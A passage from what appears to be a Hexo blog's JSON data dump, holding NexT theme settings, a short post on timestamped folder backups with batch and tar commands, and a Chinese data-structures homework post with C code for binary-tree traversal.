GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":158,"excerpt":"","more":"<h1 id=\"以当前时间备份文件\"><a href=\"#以当前时间备份文件\" class=\"headerlink\" title=\"以当前时间备份文件\"></a>以当前时间备份文件</h1><p><code>sample</code>是待备份文件夹</p>\n<p>windows<br><figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"keyword\">if</span> &quot;<span class=\"variable\">%time:~0,1%</span>&quot; <span class=\"keyword\">EQU</span> &quot; &quot; (</span><br></pre></td></tr></table></figure></p>\n<p>linux<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">time=$(date <span class=\"string\">&#x27;+%Y%m%d%H%M%S&#x27;</span> )</span><br><span class=\"line\">tar -cvf ./backup/<span class=\"variable\">$time</span>.tar ./sample/</span><br></pre></td></tr></table></figure></p>\n"},{"title":"二叉树的遍历","date":"2019-03-29T09:11:09.000Z","abbrlink":"ea4681d0","updated":"2020-04-08T10:40:24.000Z","_content":"# 二叉树的遍历\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<stdio.h>\n#include<malloc.h>\n#include<stdlib.h>\n#define MAX 20\nint NodeSum=0,LeafNode=0,Rank=0;\ntypedef struct BTNode{       /*节点结构声明*/\n\tchar data ;               /*节点数据*/\n\tstruct BTNode *lchild;\n\tstruct BTNode *rchild ;  /*指针*/\n}*BiTree;\n\nvoid createBiTree(BiTree *t){ /* 先序遍历创建二叉树*/\n\tchar s;\n\tBiTree q;\n\tprintf(\"\\nplease input data:(exit for #)\");\n\ts=getchar();\n\tif(s=='#'){*t=NULL; return;}\n\tq=(BiTree)malloc(sizeof(struct BTNode));\n\tif(q==NULL){printf(\"Memory alloc failure!\"); exit(0);}\n\tq->data=s;\n\t*t=q;\n\tcreateBiTree(&q->lchild); /*递归建立左子树*/\n\tcreateBiTree(&q->rchild); /*递归建立右子树*/\n}\n\nvoid PreOrder(BiTree p){  /* 先序遍历二叉树*/\n    if ( p!= NULL ) {\n       \tprintf(\"%c\", p->data);\n\t\tNodeSum++;\n       \tPreOrder( p->lchild ) ;\n       \tPreOrder( p->rchild) ;\n\t\tif(p->lchild==NULL&&p->rchild==NULL)\n\t\t\tLeafNode++;\n    }\n}\nint GetRank(BiTree p)\n{\n\tif (p==NULL)\n\t\treturn 0;\n\telse\n\t{\n\t\tint LRank=GetRank(p->lchild);\n\t\tint RRank=GetRank(p->rchild);\n\t\tint max=LRank;\n\t\tif (max<RRank)\n\t\t\tmax=RRank;\n\t\treturn max + 1;\n\t}\n}\nvoid InOrder(BiTree p){  /* 中序遍历二叉树*/\n    if( p!= NULL ) {\n \t InOrder( p->lchild ) ;\n   \t printf(\"%c\", p->data);\n   \t InOrder( p->rchild) ;\n    }\n}\nvoid PostOrder(BiTree p){  /* 后序遍历二叉树*/\n   if ( p!= NULL ) {\n    \tPostOrder( p->lchild ) ;\n       \tPostOrder( p->rchild) ;\n       \tprintf(\"%c\", p->data);\n    }\n}\n\nvoid Preorder_n(BiTree p){ /*先序遍历的非递归算法*/\n    BiTree stack[MAX],q;\n    int top=0,i;\n    for(i=0;i<MAX;i++) stack[i]=NULL;/*初始化栈*/\n    q=p;\n    while(q!=NULL){\n        printf(\"%c\",q->data);\n        if(q->rchild!=NULL) stack[top++]=q->rchild;\n        if(q->lchild!=NULL) q=q->lchild;\n        else\n            if(top>0) q=stack[--top];\n            else q=NULL;\n    }\n}\n\nvoid release(BiTree t){ /*释放二叉树空间*/\n  \tif(t!=NULL){\n    \trelease(t->lchild);\n    \trelease(t->rchild);\n    \tfree(t);\n  \t}\n}\nint main(){\n    BiTree t=NULL;\n    createBiTree(&t);\n    printf(\"\\n\\nPreOrder the tree is:\");\n    PreOrder(t);\n    printf(\"\\n\\nInOrder the tree is:\");\n    InOrder(t);\n    printf(\"\\n\\nPostOrder the tree is:\");\n    PostOrder(t);\n    printf(\"\\n\\nPreOrder(Not Recursive):\");\n    Preorder_n(t);\n\tprintf(\"\\nThe Sum Of Node is %d\\n\",NodeSum);\n\tprintf(\"The Sum Of LeafNode is %d\\n\",LeafNode);\n\tprintf(\"The Height Of The Tree is %d\\n\",GetRank(t));\n    release(t);\n    return 0;\n}\n```","source":"_posts/BinaryTree.md","raw":"---\ntitle: 二叉树的遍历\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 树\n  - 二叉树\nabbrlink: ea4681d0\nupdated:\n---\n# 二叉树的遍历\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<stdio.h>\n#include<malloc.h>\n#include<stdlib.h>\n#define MAX 20\nint NodeSum=0,LeafNode=0,Rank=0;\ntypedef struct BTNode{       /*节点结构声明*/\n\tchar data ;               /*节点数据*/\n\tstruct BTNode *lchild;\n\tstruct BTNode *rchild ;  /*指针*/\n}*BiTree;\n\nvoid createBiTree(BiTree *t){ /* 先序遍历创建二叉树*/\n\tchar s;\n\tBiTree q;\n\tprintf(\"\\nplease input data:(exit for #)\");\n\ts=getchar();\n\tif(s=='#'){*t=NULL; return;}\n\tq=(BiTree)malloc(sizeof(struct BTNode));\n\tif(q==NULL){printf(\"Memory alloc failure!\"); exit(0);}\n\tq->data=s;\n\t*t=q;\n\tcreateBiTree(&q->lchild); /*递归建立左子树*/\n\tcreateBiTree(&q->rchild); /*递归建立右子树*/\n}\n\nvoid PreOrder(BiTree p){  /* 先序遍历二叉树*/\n    if ( p!= NULL ) {\n       \tprintf(\"%c\", p->data);\n\t\tNodeSum++;\n       \tPreOrder( p->lchild ) ;\n       \tPreOrder( p->rchild) ;\n\t\tif(p->lchild==NULL&&p->rchild==NULL)\n\t\t\tLeafNode++;\n    }\n}\nint GetRank(BiTree p)\n{\n\tif (p==NULL)\n\t\treturn 0;\n\telse\n\t{\n\t\tint LRank=GetRank(p->lchild);\n\t\tint RRank=GetRank(p->rchild);\n\t\tint max=LRank;\n\t\tif (max<RRank)\n\t\t\tmax=RRank;\n\t\treturn max + 1;\n\t}\n}\nvoid InOrder(BiTree p){  /* 中序遍历二叉树*/\n    if( p!= NULL ) {\n \t InOrder( p->lchild ) ;\n   \t printf(\"%c\", p->data);\n   \t InOrder( p->rchild) ;\n    }\n}\nvoid PostOrder(BiTree p){  /* 后序遍历二叉树*/\n   if ( p!= NULL ) {\n    \tPostOrder( p->lchild ) ;\n       \tPostOrder( p->rchild) ;\n       \tprintf(\"%c\", p->data);\n    }\n}\n\nvoid Preorder_n(BiTree p){ /*先序遍历的非递归算法*/\n    BiTree stack[MAX],q;\n    int top=0,i;\n    for(i=0;i<MAX;i++) stack[i]=NULL;/*初始化栈*/\n    q=p;\n    while(q!=NULL){\n        printf(\"%c\",q->data);\n        if(q->rchild!=NULL) stack[top++]=q->rchild;\n        if(q->lchild!=NULL) q=q->lchild;\n        else\n            if(top>0) q=stack[--top];\n            else q=NULL;\n    }\n}\n\nvoid release(BiTree t){ /*释放二叉树空间*/\n  \tif(t!=NULL){\n    \trelease(t->lchild);\n    \trelease(t->rchild);\n    \tfree(t);\n  \t}\n}\nint main(){\n    BiTree t=NULL;\n    createBiTree(&t);\n    printf(\"\\n\\nPreOrder the tree is:\");\n    PreOrder(t);\n    printf(\"\\n\\nInOrder the tree is:\");\n    InOrder(t);\n    printf(\"\\n\\nPostOrder the tree is:\");\n    PostOrder(t);\n    printf(\"\\n\\nPreOrder(Not Recursive):\");\n    Preorder_n(t);\n\tprintf(\"\\nThe Sum Of Node is %d\\n\",NodeSum);\n\tprintf(\"The Sum Of LeafNode is %d\\n\",LeafNode);\n\tprintf(\"The Height Of The Tree is %d\\n\",GetRank(t));\n    release(t);\n    return 0;\n}\n```","slug":"BinaryTree","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkaa0009qse58whw6h5c","content":"<h1 id=\"二叉树的遍历\"><a href=\"#二叉树的遍历\" class=\"headerlink\" title=\"二叉树的遍历\"></a>二叉树的遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 20</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> NodeSum=<span class=\"number\">0</span>,LeafNode=<span class=\"number\">0</span>,Rank=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span>&#123;</span>       <span class=\"comment\">/*节点结构声明*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> data ;               <span class=\"comment\">/*节点数据*/</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span> *<span class=\"title\">lchild</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span> *<span class=\"title\">rchild</span> ;</span>  <span class=\"comment\">/*指针*/</span></span><br><span class=\"line\">&#125;*BiTree;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree *t)</span></span>&#123; <span class=\"comment\">/* 先序遍历创建二叉树*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> s;</span><br><span class=\"line\">\tBiTree q;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nplease input data:(exit for #)&quot;</span>);</span><br><span class=\"line\">\ts=getchar();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(s==<span class=\"string\">&#x27;#&#x27;</span>)&#123;*t=<span class=\"literal\">NULL</span>; <span class=\"keyword\">return</span>;&#125;</span><br><span class=\"line\">\tq=(BiTree)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(struct BTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(q==<span class=\"literal\">NULL</span>)&#123;<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Memory alloc failure!&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);&#125;</span><br><span class=\"line\">\tq-&gt;data=s;</span><br><span class=\"line\">\t*t=q;</span><br><span class=\"line\">\tcreateBiTree(&amp;q-&gt;lchild); <span class=\"comment\">/*递归建立左子树*/</span></span><br><span class=\"line\">\tcreateBiTree(&amp;q-&gt;rchild); <span class=\"comment\">/*递归建立右子树*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PreOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 先序遍历二叉树*/</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">       \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">\t\tNodeSum++;</span><br><span class=\"line\">       \tPreOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">       \tPreOrder( p-&gt;rchild) ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(p-&gt;lchild==<span class=\"literal\">NULL</span>&amp;&amp;p-&gt;rchild==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\tLeafNode++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">GetRank</span><span class=\"params\">(BiTree p)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> LRank=GetRank(p-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> RRank=GetRank(p-&gt;rchild);</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> max=LRank;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (max&lt;RRank)</span><br><span class=\"line\">\t\t\tmax=RRank;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> max + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 中序遍历二叉树*/</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\"> \t InOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">   \t <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">   \t InOrder( p-&gt;rchild) ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PostOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 后序遍历二叉树*/</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    \tPostOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">       \tPostOrder( p-&gt;rchild) ;</span><br><span class=\"line\">       \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Preorder_n</span><span class=\"params\">(BiTree p)</span></span>&#123; <span class=\"comment\">/*先序遍历的非递归算法*/</span></span><br><span class=\"line\">    BiTree <span class=\"built_in\">stack</span>[MAX],q;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> top=<span class=\"number\">0</span>,i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;MAX;i++) <span class=\"built_in\">stack</span>[i]=<span class=\"literal\">NULL</span>;<span class=\"comment\">/*初始化栈*/</span></span><br><span class=\"line\">    q=p;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(q!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,q-&gt;data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q-&gt;rchild!=<span class=\"literal\">NULL</span>) <span class=\"built_in\">stack</span>[top++]=q-&gt;rchild;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q-&gt;lchild!=<span class=\"literal\">NULL</span>) q=q-&gt;lchild;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(top&gt;<span class=\"number\">0</span>) q=<span class=\"built_in\">stack</span>[--top];</span><br><span class=\"line\">            <span class=\"keyword\">else</span> q=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">release</span><span class=\"params\">(BiTree t)</span></span>&#123; <span class=\"comment\">/*释放二叉树空间*/</span></span><br><span class=\"line\">  \t<span class=\"keyword\">if</span>(t!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">    \trelease(t-&gt;lchild);</span><br><span class=\"line\">    \trelease(t-&gt;rchild);</span><br><span class=\"line\">    \t<span class=\"built_in\">free</span>(t);</span><br><span class=\"line\">  \t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    BiTree t=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    createBiTree(&amp;t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPreOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    PreOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nInOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    InOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPostOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    PostOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPreOrder(Not Recursive):&quot;</span>);</span><br><span class=\"line\">    Preorder_n(t);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nThe Sum Of Node is %d\\n&quot;</span>,NodeSum);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The Sum Of LeafNode is %d\\n&quot;</span>,LeafNode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The Height Of The Tree is %d\\n&quot;</span>,GetRank(t));</span><br><span class=\"line\">    release(t);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on 